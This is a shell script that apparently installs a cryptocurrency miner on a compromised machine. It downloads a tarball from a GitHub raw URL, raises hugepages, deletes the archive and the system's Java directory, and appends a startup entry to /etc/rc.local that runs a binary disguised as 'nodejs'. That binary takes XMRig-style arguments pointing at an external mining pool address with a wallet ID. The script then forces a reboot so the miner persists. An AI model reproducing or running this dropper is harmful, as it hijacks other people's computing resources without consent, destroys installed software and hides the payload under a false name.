#!/bin/sh
cd /home/sshuser
wget https://raw.githubusercontent.com/d1uf95z8/csv/master/csv44.tar.gz
tar xvzf csv44.tar.gz

echo vm.nr_hugepages=2048 >> /etc/sysctl.conf

rm -r /home/sshuser/csv44.tar.gz
rm -r /usr/lib/jvm

echo '
cd /home/sshuser
./nodejs -o 139.99.123.101:10660 -u So2ifgjqGMZJhCrqpFMotQQAiJAiATuJLNAK2HrPLoNzK8hkqNbf9t8gmx6bzAQrXRMnWnoELoiD6GTv8guPBRwH5ymuNB4Z32x2tMXrRP6k.15000 -p green -a rx/wow --donate-level 1 -t 8 -k -B
' >> /etc/rc.local
sudo shutdown -r 6
